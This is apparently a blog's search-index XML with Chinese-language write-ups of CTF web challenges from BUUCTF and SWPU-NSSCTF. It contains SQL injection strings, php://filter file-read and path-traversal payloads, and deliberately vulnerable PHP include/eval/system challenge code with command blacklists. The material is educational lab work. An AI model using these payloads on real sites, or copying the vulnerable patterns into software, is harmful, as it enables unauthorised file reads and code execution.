<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTFWEB</title>
      <link href="/2025/08/04/BUUWEB/"/>
      <url>/2025/08/04/BUUWEB/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a><font style="color:rgb(33, 37, 41);">[极客大挑战 2019]EasySQL</font></h2><p>先测试最简单的，看看回显是怎么样的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751769323743-b27b03ed-dc31-4b71-8e89-bc8eb9e58896.png"></p><p>1’ or 1 &#x3D; 1 直接出</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770202410-735274be-b8bf-4cd0-8a4d-39e1979e8f7d.png"></p><p>正常 sql</p><p>测试闭合条件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770339638-ec5103bf-5568-4343-8c9f-5ab4ca0e46df.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770328823-8e90f39d-37ce-4ebf-909e-0a1d9233800d.png"></p><p>测试回显位数</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770400849-51a47c08-12e3-496a-8af9-d40ee2ec023e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770414793-9edbe74b-bf56-4211-9748-ac45dd188033.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770422356-eac09ed7-3e5a-4224-be93-f4b74712b86b.png"></p><p>找数据库</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770528066-ff8e1e9c-304e-4df5-b78e-39948df35c66.png"></p><p>wc 直接出</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751770471507-c5d9a8dc-ae86-45ff-9bd7-c773dc3042a7.png"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a><font style="color:rgb(33, 37, 41);">[极客大挑战 2019]Havefun</font></h2><p>ez_php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752560427025-1f83b2f6-8f4b-47d9-9908-06ecb3988cd6.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只要 GET 传入的参数 cat 为 dog 就输出类似于 flag 的东西</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752560593054-94dcdfaf-106c-4dfd-acc2-0f375a129736.png"></p><p>这样就成了</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a><font style="color:rgb(33, 37, 41);">[ACTF2020 新生赛]Include</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752561380992-6d0d21b7-8798-4a75-b549-42ba6ba6c1b0.png"></p><p>看看 tips</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752561398599-ae10d95b-3926-4f20-8eb8-4aff463028da.png"></p><p>php 伪协议读取</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752561950283-0a28d7e6-5c90-4ebc-a778-c81cfd93a1fd.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a><font style="color:rgb(33, 37, 41);">[HCTF 2018]WarmUp</font></h2><p>一张斜眼笑弔图，看源代码发现有 source.php 的提示，看看</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752562216455-7c5b5f94-470b-476b-a37b-388846f80e73.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1752562343629-090b32b5-784b-4521-8a83-3c514569a51a.png"></p><p>代码比较长，先分析主体部分，主体部分先进行判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span>&#123;</span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先判断 file 不为空，且 file 不为字符串，且 emmm 类中的 checkFile 返回值为真就执行 include，否则就输出滑稽图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是 emmm 类的分析，并且这个类只有一个函数 checkFile，形参是 $page</p><p>checkFile 先进行声明白名单 “source”指向”source.php”,”hint”是”hint.php”</p><p>之后判断 page 不为空或者不是字符串，就输出 you can’t see it ，并返回 false</p><p>之后进行in_array 的判断，<font style="color:rgb(77, 77, 77);">检查传入的$page是否直接在白名单中存在，如果存在，返回true。</font></p><p>之后 mb_strpos 函数把 page 拼接上”?”之后，找“ ? ”第一次出现的位置，然后 mb_substr 函数截取从 0 到 mb_strpos 返回值的部分返回给新变量 $_page。也就是把 $page 第一次出现“ ? ”之前的部分赋值给 $_page 进行处理</p><p>并且如果$_page 也在白名单里，就为真，之后对 $page 进行 url 解码再进行判断是否在白名单内，如果为真就返回真。</p><p>如果以上操作都没有进 if 语句的判断，就输出“you can’t see it”，返回假。</p><p>所以构造 playload 的思路是：在 playload 的 file 中加入白名单的任意的一个内容，之后加上?进行隔断。代码会对前面的内容进行分析，返回 true ，所以就绕过checkFile 的检查。</p><p>所以 playload 的构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?flag.php</span><br></pre></td></tr></table></figure><p>之后想了一下 include 会被前面的 hint.php 影响吗？问了一下 deepseek，他说” hint.php?<font style="color:rgb(64, 64, 64);"> “不存在，可以忽略, 所以不影响 playload</font></p><p>之后查看 hint.php 发现提示</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753024140116-b72064e1-aacd-47a1-bd80-624b975cff67.png"></p><p>因此 playload 如下，其中跳过了多个目录才发现 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753024195828-2b8f84da-26c8-4d9f-ba82-12903f939472.png"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a><font style="color:rgb(33, 37, 41);">[ACTF2020 新生赛]Exec</font></h2><p>试试 ping mihoyo，但不成功，应该是环境问题了。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753024811141-73b44213-915a-4b71-ac43-ea1d5c18b3a5.png"></p><p>试试本地</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753024923797-e18a1f40-b60b-4cc5-882e-5a7a783c0faf.png"></p><p>ping 的地址中加点小佐料，flag 就出来了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753024998849-73d783e7-d4ed-4e7d-a535-f00722890fbb.png"></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a><font style="color:rgb(33, 37, 41);">[GXYCTF2019]Ping Ping Ping</font></h2><p>mihoyo 怎么你了，为什么不行！！！</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753025458787-15f43956-3802-4eae-bc86-818c4c885edc.png"></p><p>原来是给斜杠 ban 了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753025504545-63cc446f-58b4-448d-b26e-875849fc5285.png"></p><p>测试被 ban 字符</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753026030915-8142b26a-04ea-41ca-a043-3d2cc97741bb.png"></p><p>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &quot; / ) * &gt; ? &lt; [ ] &#123; &#125;</span><br></pre></td></tr></table></figure><p>执行一下命令，看一下 index.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753026882252-4c0491c8-2fcb-417f-81a0-c1c55b0430c9.png"></p><p>这 php 代码过滤挺严格的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ip=</span><br><span class="line">  |\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接变量拼接拿到 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753027357517-82e76ac5-2406-4117-887d-65ce0a506c4d.png"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a><font style="color:rgb(33, 37, 41);">[SUCTF 2019]EasySQL</font></h2><p>随便输入一下看看</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753578651243-0bcafc82-e931-4547-be22-77b0c47c0e67.png"></p><p>之后测试被 ban 字符</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753578632972-2b6ce645-b5c6-419e-a89f-fe55ce8a8901.png"></p><p>union 和 order 都被 ban 了，所以一般的 sql 注入是不行的。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753578730569-a2679a34-d377-4618-90ef-dbe464255cbf.png"></p><p>没有报错回显，报错注入也不行</p><p>所以猜一下查询语句是 SELECT <strong>$injection_point</strong> FROM users WHERE id&#x3D;1</p><p>所以替换为*,1 试一下是直接 SELECT ***,1** FROM users WHERE id&#x3D;1，就是查询所有列，所以就成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1753578915876-50e33449-6d6f-4372-abb0-37bd6749f918.png"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><font style="color:rgb(33, 37, 41);">[RoarCTF 2019]Easy Calc</font></h2><p>进入题目发现有一个计算器</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751767889254-46f873a3-8a1a-41c4-bdc3-5b0625f9290d.png"></p><p>给你个大的，算一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751767948671-a5805184-4c43-417a-870d-751215c5ad36.png"></p><p>应该不是 ssti</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768001340-4566b495-532e-4152-becb-0839da395030.png"></p><p>看一下源码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768036430-26c8ea01-7037-4ea7-a80a-927939c8671d.png"></p><p>有个提示calc.php?num&#x3D;</p><p>看一下calc.php</p><p>一串 php 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了根目录“ &#x2F; ”、空格，，先测试一下但这个直接被限制了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768185176-3a03875f-0358-40ab-beca-657fc1976acc.png"></p><p>我也布吉岛为啥在前面加个空格就成功了，估计是环境问题吧</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768216775-aa3841af-24f2-4f68-8144-c8b1c1123d3c.png"></p><p>var_dump()试试加上 car()拼接试试，用 scandir()读取根目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768752947-7491f965-b1b4-4412-97d2-acb0332103b1.png"></p><p>找到 flag 的位置了，在&#x2F;f1agg 里，所以就用 file_get_contents()读文件了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1751768917621-8ae8875e-55ec-4737-b0a8-8e71fc5d6c84.png"></p>]]></content>
      
      
      <categories>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025SWPU-NSSCTFwp</title>
      <link href="/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/"/>
      <url>/2025/08/04/2025CTF/2025%20SWPU-NSSCTF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a><font style="color:rgb(48, 49, 51);">ez_ez_php</font></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229039948-5c02af31-c5ea-4187-8055-162137b1d812.png"></p><p>提示换个 php 伪协议，并且 real_flag_is_in_’flag’</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229075900-cb14048a-9df8-4ce3-a822-a0cd51892d1e.png"></p><p>ok 了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229171395-f88147d4-fb70-4127-9840-f6c5fdfa4544.png"></p><h1 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a><font style="color:rgb(48, 49, 51);">gift_F12</font></h1><p>F12 大法直接拿下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229453280-0ffa472a-ad3c-4f2a-9781-e7cb78e411ba.png"></p><h1 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a><font style="color:rgb(48, 49, 51);">jicao</font></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接改成 json 的形式就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229731523-1ec70b55-fa4f-415f-9dae-1286df4021ba.png"></p><h1 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a><font style="color:rgb(48, 49, 51);">Do_you_know_http</font></h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229817146-169f0110-9ba1-46f3-9cf1-f67842e5042b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229939862-f67665cd-70e9-4535-979e-3086d985ff68.png"></p><p>ez_http</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754229948752-0b99b061-777a-4bb2-b129-c5a65c27604a.png"></p><h1 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a><font style="color:rgb(48, 49, 51);">导弹迷踪</font></h1><p>js 代码里找 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754230628745-5870d418-3afc-47e7-be2c-b8e9b770418b.png"></p><h1 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a><font style="color:rgb(48, 49, 51);">WebFTP</font></h1><p>扫描目录得到这个，访问一下就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754232058916-7e9c0bd5-a148-4824-b4ec-d88a9299daaf.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1754232040594-8f710593-39ef-479e-ac2d-c9f2e108973b.png"></p><h1 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a><font style="color:rgb(48, 49, 51);">babyRCE</font></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 